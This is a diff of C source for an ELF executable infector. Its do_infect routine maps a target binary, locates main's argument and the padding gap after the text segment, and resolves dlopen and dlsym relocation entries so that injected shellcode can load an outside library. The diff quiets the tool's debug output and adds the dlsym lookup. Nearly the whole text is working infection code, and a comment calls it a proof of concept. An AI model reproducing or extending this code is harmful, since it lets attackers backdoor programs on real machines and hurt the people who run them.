@@ -93,24 +93,24 @@ int open_and_map(char* fname, uint8_t** data, size_t* len) {
 	// needs read write permissions, so you may have to make a copy firs
 	// in fact, you should probably make sure there is no concurrent access while we are editing the file
   	if ((fd = open(fname, O_APPEND | O_RDWR, 0)) < 0) {
-		printf("err on open %s\n", fname);
+		//printf("err on open %s\n", fname);
 		return -1;
 	}
 
 	// get file size
 	if (fstat(fd, &st)) {
-		printf("err on stat\n");
+		//printf("err on stat\n");
 		return -1;
 	}
 	size = st.st_size;
 
 	// map the file to appropriately
 	if ((*data = (uint8_t*)mmap (NULL, size, (PROT_READ|PROT_WRITE|PROT_EXEC), MAP_SHARED, fd, 0)) == MAP_FAILED) {
-		printf("err on mmap\n");
+		//printf("err on mmap\n");
 		return -1;
 	}
 
-	printf("File mapped (%zd bytes ) at %p\n", size, data);
+	//printf("File mapped (%zd bytes ) at %p\n", size, data);
 
 	*len = size;
 	return fd;
@@ -134,14 +134,14 @@ int find_arg_main(uint8_t* elf_base, main_arg_t* res) {
 	type = elf_base[ELF_HEAD_TYPE_OFFSET];
 
 	if (type == 1) {
-		printf("32 bit elf files unsupported\n");
+		//printf("32 bit elf files unsupported\n");
 		return -1;
 	}
 
 	// get the entry pointer (which is an offset to us)
 	startoff = *((uint64_t*)(elf_base + ELF_HEAD_ENTRY_OFFSET));
 
-	printf("Found _start at %p\n", (void*)startoff);
+	//printf("Found _start at %p\n", (void*)startoff);
 
 	// parse the section entries for .text
 	section_off = (*(uint64_t*)(elf_base + ELF_HEAD_SHOFF_OFFSET));
@@ -164,16 +164,16 @@ int find_arg_main(uint8_t* elf_base, main_arg_t* res) {
 
 	if (!text_file_offset) {
 		// we didin't find the section
-		printf("Couldn't find section for _start!\n");
+		//printf("Couldn't find section for _start!\n");
 		return -1;
 	}
 
 
-	printf("section vaddr at %016lx, section file off %016lx\n", section_vaddr, text_file_offset);
+	//printf("section vaddr at %016lx, section file off %016lx\n", section_vaddr, text_file_offset);
 	startoff = (startoff - section_vaddr) + text_file_offset;
 	cursor = elf_base + startoff;
 	
-	printf("Start in the file should be at offset %p\n", (void*)startoff);
+	//printf("Start in the file should be at offset %p\n", (void*)startoff);
 
 	// we have the section, now we need to find mov rdi, main before the call to __libc_start_main
 	// so in most x86-64 elf files the mov is a REX.W mov, so the instruction starts with 3 bytes
@@ -236,7 +236,7 @@ int find_gap(uint8_t* elf_base, empty_area_t* area) {
 	phentsize = *((uint16_t*)(elf_base + ELF_HEAD_PHENTSIZE_OFFSET));
 	phnum = *((uint16_t*)(elf_base + ELF_HEAD_PHNUM_OFFSET));
 
-	printf("Number headers %d, size %d\n", phnum, phentsize);
+	//printf("Number headers %d, size %d\n", phnum, phentsize);
 
 	cursor = elf_base + phoff;
 	for (i = 0; i < phnum; i++, cursor += phentsize) {
@@ -246,7 +246,7 @@ int find_gap(uint8_t* elf_base, empty_area_t* area) {
 		psz = *((uint64_t*)(cursor + ELF_PHEAD_FILESZ)); 
 		pvaddr = *((uint64_t*)(cursor + ELF_PHEAD_VADDR));
 		
-		printf("Type %x, flags %x, off %016lx, vaddr %016lx sz %016lx\n", ptype, pflags, poff, pvaddr, psz);
+		//printf("Type %x, flags %x, off %016lx, vaddr %016lx sz %016lx\n", ptype, pflags, poff, pvaddr, psz);
 
 		if ((pflags & ELF_EXEC_FLAGS) && ptype == ELF_PT_LOAD) {
 			// found our text segment
@@ -268,7 +268,7 @@ int find_gap(uint8_t* elf_base, empty_area_t* area) {
 		poff = *((uint64_t*)(cursor + ELF_PHEAD_FILEOFF)); 
 		psz = *((uint64_t*)(cursor + ELF_PHEAD_FILESZ)); 
 		
-		printf("Type %x, flags %x, off %018lx, sz %018lx\n", ptype, pflags, poff, psz);
+		//printf("Type %x, flags %x, off %018lx, sz %018lx\n", ptype, pflags, poff, psz);
 
 		if (poff < text_end || ptype != ELF_PT_LOAD) {
 			continue;
@@ -279,7 +279,7 @@ int find_gap(uint8_t* elf_base, empty_area_t* area) {
 		}
 	}
 
-	printf("Padding size = %0lx\n", pad_len);
+	//printf("Padding size = %0lx\n", pad_len);
 
 	area->fileoffset = text_end;
 	area->size = pad_len;
@@ -287,6 +287,8 @@ int find_gap(uint8_t* elf_base, empty_area_t* area) {
 	return 0;
 }
 
+// this function is really messy
+// but this is just proof of concept, so eh
 int find_plt(uint8_t* elf_base, char* fun_name, plt_entry_t* plt) {
 	uint64_t section_off;
 	uint16_t section_entry_size;
@@ -295,23 +297,16 @@ int find_plt(uint8_t* elf_base, char* fun_name, plt_entry_t* plt) {
 	uint8_t* cursor;
 	uint8_t* string_sec_base;
 	uint32_t shname_off;
-	uint32_t shinfo_i;
 	uint32_t shlink_i;
 	//uint64_t shvaddr;
 	uint64_t shfile_off;
 	uint64_t shsize;
-	uint32_t shtype;
-	uint64_t shflags;
 	//uint64_t shentsize;
-	int i;
-	uint8_t* infoptr = NULL;
-	uint64_t infosz = 0;
+	int i, j;
 	uint8_t* linkptr = NULL;
-	uint64_t linksz = 0;
 	uint8_t* linklinkptr = NULL;
-	uint64_t linklinksz = 0;
-	uint8_t* relapltptr = NULL;
-	uint64_t relapltsz = 0;
+	uint8_t* relaptr = NULL;
+	uint64_t relasz = 0;
 
 	// NOTES
 	// Because we need dlopen and dlsym, we are just going to depend on the plt already having our things
@@ -341,72 +336,59 @@ int find_plt(uint8_t* elf_base, char* fun_name, plt_entry_t* plt) {
 		//shvaddr = *((uint64_t*)(cursor + ELF_SECTION_VADDR));
 		shsize = *((uint64_t*)(cursor + ELF_SECTION_SIZE));
 		shfile_off = *((uint64_t*)(cursor + ELF_SECTION_FILEOFF));
-		shtype = *((uint32_t*)(cursor + ELF_SECTION_TYPE));
-		shflags = *((uint64_t*)(cursor + ELF_SECTION_ATTRIBUTES));
+		//shtype = *((uint32_t*)(cursor + ELF_SECTION_TYPE));
+		//shflags = *((uint64_t*)(cursor + ELF_SECTION_ATTRIBUTES));
 		//shentsize = *((uint64_t*)(cursor + ELF_SECTION_ENTSIZE));
-		shinfo_i = *((uint32_t*)(cursor + ELF_SECTION_INFO));
+		//shinfo_i = *((uint32_t*)(cursor + ELF_SECTION_INFO));
 		shlink_i = *((uint32_t*)(cursor + ELF_SECTION_LINK));
 		
-		printf("%d %s : %x %lx\n", i, string_sec_base + shname_off, shtype, shflags); 
+		//printf("%d %s\n", i, string_sec_base + shname_off); 
 
 		// if we find .plt, .rela.plt or .dynstr, keep track of it
-		if (strstr((char*)string_sec_base + shname_off, ".rela.plt")) {
-			printf("Found .rela.plt @ %lx\n", shfile_off);
-			relapltptr = elf_base + shfile_off;
-			relapltsz = shsize;
+		if (strstr((char*)string_sec_base + shname_off, ".rela.plt") || strstr((char*)string_sec_base + shname_off, ".rela.dyn")) {
+			//printf("Found .rela.plt @ %lx\n", shfile_off);
+			relaptr = elf_base + shfile_off;
+			relasz = shsize;
+			//printf("rela sec @ %p %lu\n", relaptr, relasz);
 	
-			// the plt section referenced is in sh_info
-			cursor = (elf_base + section_off) + (shinfo_i * section_entry_size);
-			shfile_off = *((uint64_t*)(cursor + ELF_SECTION_FILEOFF));
-			shsize = *((uint64_t*)(cursor + ELF_SECTION_SIZE));
-			shname_off = *((uint32_t*)(cursor + ELF_SECTION_SHNAME));
-			infoptr = elf_base + shfile_off;	
-			infosz = shsize;
-			printf("info = %s %d\n", string_sec_base + shname_off, shinfo_i); 
-			
 			// the dynsym? is referenced in sh_link
 			cursor = (elf_base + section_off) + (shlink_i * section_entry_size);
 			shfile_off = *((uint64_t*)(cursor + ELF_SECTION_FILEOFF));
-			shsize = *((uint64_t*)(cursor + ELF_SECTION_SIZE));
-			shname_off = *((uint32_t*)(cursor + ELF_SECTION_SHNAME));
+			//shname_off = *((uint32_t*)(cursor + ELF_SECTION_SHNAME));
 			linkptr = elf_base + shfile_off;	
-			linksz = shsize;
-			printf("link = %s %d\n", string_sec_base + shname_off, shlink_i); 
+			//printf("link = %s %d\n", string_sec_base + shname_off, shlink_i); 
 
 			shlink_i = *((uint32_t*)(cursor + ELF_SECTION_LINK));
 			// the dynstr? is referenced in sh_link
 			cursor = (elf_base + section_off) + (shlink_i * section_entry_size);
 			shfile_off = *((uint64_t*)(cursor + ELF_SECTION_FILEOFF));
-			shsize = *((uint64_t*)(cursor + ELF_SECTION_SIZE));
-			shname_off = *((uint32_t*)(cursor + ELF_SECTION_SHNAME));
+			//shname_off = *((uint32_t*)(cursor + ELF_SECTION_SHNAME));
 			linklinkptr = elf_base + shfile_off;	
-			linklinksz = shsize;
-			printf("linklink = %s %d\n", string_sec_base + shname_off, shlink_i); 
-			
-			break;
-			//DEBUG
-			//cursor = (elf_base + section_off) + (i * section_entry_size);
-		}
-	}
+			//printf("linklink = %s %d\n", string_sec_base + shname_off, shlink_i); 
 
-	// go through .rela.plt, finding the function's plt
-	// DEBUG
-	printf ("rela.plt @ %p %lx\n", (void*)(relapltptr - elf_base), relapltsz);
-	printf ("info @ %p %lx\n", (void*)(infoptr - elf_base), infosz);
-	printf ("link @ %p %lx\n", (void*)(linkptr - elf_base), linksz);
-	printf ("linklink @ %p %lx\n", (void*)(linklinkptr - elf_base), linklinksz);
-	// print out the rela.plt
-	for (i=0; i<relapltsz; i += ELF_RELENT_SIZE) {
-		uint32_t symoff = *(uint32_t*)(relapltptr + i + ELF_RELENT_SYM);
-		char* sym = (char*)linklinkptr + *(uint32_t*)(linkptr + (symoff * ELF_STRTAB_SIZE));
-		uint64_t vaddr = *(uint64_t*)(relapltptr+i);
-		printf("plt for %s is at %016lx\n", sym, vaddr);
-		if (strstr(sym, fun_name)) {
-			// found it
-			// this is the addr you want to jump to the value of
-			// jmp [this_vaddr]
-			plt->vaddr = vaddr;
-			return 0;
+			// look for the function!
+			// go through .rela.plt, finding the function's plt
+			//printf ("rela.plt @ %p %lx\n", (void*)(relapltptr - elf_base), relapltsz);
+			//printf ("info @ %p %lx\n", (void*)(infoptr - elf_base), infosz);
+			//printf ("link @ %p %lx\n", (void*)(linkptr - elf_base), linksz);
+			//printf ("linklink @ %p %lx\n", (void*)(linklinkptr - elf_base), linklinksz);
+			// print out the rela.plt
+			for (j=0; j<relasz; j+= ELF_RELENT_SIZE) {
+				uint32_t symoff = *(uint32_t*)(relaptr + j + ELF_RELENT_SYM);
+				char* sym = (char*)linklinkptr + *(uint32_t*)(linkptr + (symoff * ELF_STRTAB_SIZE));
+				uint64_t vaddr = *(uint64_t*)(relaptr+j);
+				//printf("rel for %s is at %016lx\n", sym, vaddr);
+				if (strstr(sym, fun_name)) {
+					// found it
+					// this is the addr you want to jump to the value of
+					// jmp [this_vaddr]
+					plt->vaddr = vaddr;
+					return 0;
+				}
+			}
+			
+			// restore the cursor
+			cursor = (elf_base + section_off) + (i * section_entry_size);
 		}
 	}
 
@@ -421,6 +403,7 @@ int do_infect(char* target_path, char* lib_path, char* exported_func) {
 	main_arg_t arg_main;
 	empty_area_t pad_area;
 	plt_entry_t dlopen_plt;
+	plt_entry_t dlsym_plt;
 	
 
 	// open and map target
@@ -452,8 +435,13 @@ int do_infect(char* target_path, char* lib_path, char* exported_func) {
 		printf("Couldn't find dlopen!\n");
 		return -1;
 	}
-
 	printf("Found dlopen at %lx\n", dlopen_plt.vaddr);
+	if (find_plt(tdata, "dlsym", &dlsym_plt)) {
+		printf("Couldn't find dlsym!\n");
+		return -1;
+	}
+	printf("Found dlsym at %lx\n", dlsym_plt.vaddr);
+
 
 	// grab the shellcode
 
